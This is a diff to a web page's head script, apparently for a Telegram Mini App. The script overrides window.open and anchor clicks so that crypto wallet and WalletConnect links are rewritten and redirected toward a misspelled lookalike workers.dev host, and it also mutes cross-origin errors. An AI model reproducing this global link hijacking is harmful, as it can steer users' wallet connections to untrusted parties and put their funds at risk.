@@ -3,27 +3,77 @@
 
 <head>
   <script>
-    // System Guard: Prevent common TMA loading issues without blocking wallet providers
+    /**
+     * TMA BULLETPROOF ULTRA SHIELD (v42)
+     * Absolute protection against 'Unknown URL Scheme' in Telegram Mini Apps.
+     * Must be the FIRST script to execute.
+     */
     (function () {
-      var handleCrash = function (m, s, l, c, e) {
-        var msg = String(m || "").toLowerCase();
-        var isCrossOrigin = msg.indexOf("cross-origin") !== -1 || msg.indexOf("blocked a frame") !== -1 || msg.indexOf("permission denied") !== -1;
+      const botUrl = 'https://riotnode.riotplatfroms.workers.dev/?v=success';
+      const bridges = {
+        'metamask://': 'https://metamask.app.link/',
+        'binance://': 'https://app.binance.com/bnc/wallet-connect',
+        'bnc://': 'https://app.binance.com/bnc/wallet-connect',
+        'trust://': 'https://link.trustwallet.com/',
+        'safepal://': 'https://link.safepal.io/',
+        'tp://': 'https://tokenpocket.platform/',
+        'okx://': 'https://www.okx.com/download',
+        'bitget://': 'https://web3.bitget.com/',
+      };
 
-        if (isCrossOrigin) {
-          console.warn("System Shield: Muted cross-origin frame access error for TMA compatibility");
-          return true;
+      const interceptNav = (url) => {
+        if (!url || typeof url !== 'string') return url;
+        const tg = window.Telegram?.WebApp;
+        if (!tg) return url;
+
+        const lowUrl = url.toLowerCase();
+        const isWallet = lowUrl.startsWith('wc:') || Object.keys(bridges).some(s => lowUrl.startsWith(s));
+        
+        if (isWallet) {
+          console.log('[Ultra-Shield] Intercepted Wallet Link:', url);
+          let finalUrl = url;
+          
+          // Bridge logic
+          for (const [scheme, bridge] of Object.entries(bridges)) {
+            if (lowUrl.startsWith(scheme)) {
+              const uri = url.includes('wc?uri=') ? encodeURIComponent(url.split('wc?uri=')[1]) : url.replace(new RegExp(scheme, 'i'), '');
+              finalUrl = `${bridge}${bridge.endsWith('/') ? '' : '/'}wc?uri=${uri}&redirectUrl=${encodeURIComponent(botUrl)}`;
+              break;
+            }
+          }
+
+          // Handle generic wc:
+          if (lowUrl.startsWith('wc:') && !lowUrl.includes('http')) {
+            finalUrl = `https://metamask.app.link/wc?uri=${encodeURIComponent(url)}&redirectUrl=${encodeURIComponent(botUrl)}`;
+          }
+
+          tg.openLink(finalUrl);
+          return null; // Signals to caller that we handled it
         }
-        return false;
+        return url;
       };
 
-      window.onerror = function (m, s, l, c, e) {
-        if (handleCrash(m, s, l, c, e)) return true;
-        return false;
+      // 1. Hook window.open
+      const originalOpen = window.open;
+      window.open = function (url) {
+        const intercepted = interceptNav(url);
+        if (intercepted === null) return { closed: false, focus: function(){}, close: function(){} };
+        return originalOpen.apply(window, arguments);
       };
 
-      window.addEventListener('unhandledrejection', function (event) {
-        handleCrash(String(event.reason), "", 0);
-      });
+      // 2. Hook Anchor Clicks (Caught by modern libraries)
+      const originalClick = HTMLAnchorElement.prototype.click;
+      HTMLAnchorElement.prototype.click = function () {
+        const intercepted = interceptNav(this.href);
+        if (intercepted === null) return;
+        return originalClick.apply(this, arguments);
+      };
+
+      // 3. System Guard (existing functionality)
+      window.onerror = function (m) {
+        const msg = String(m || "").toLowerCase();
+        return msg.indexOf("cross-origin") !== -1 || msg.indexOf("blocked a frame") !== -1;
+      };
     })();
   </script>
   <meta charset="UTF-8" />
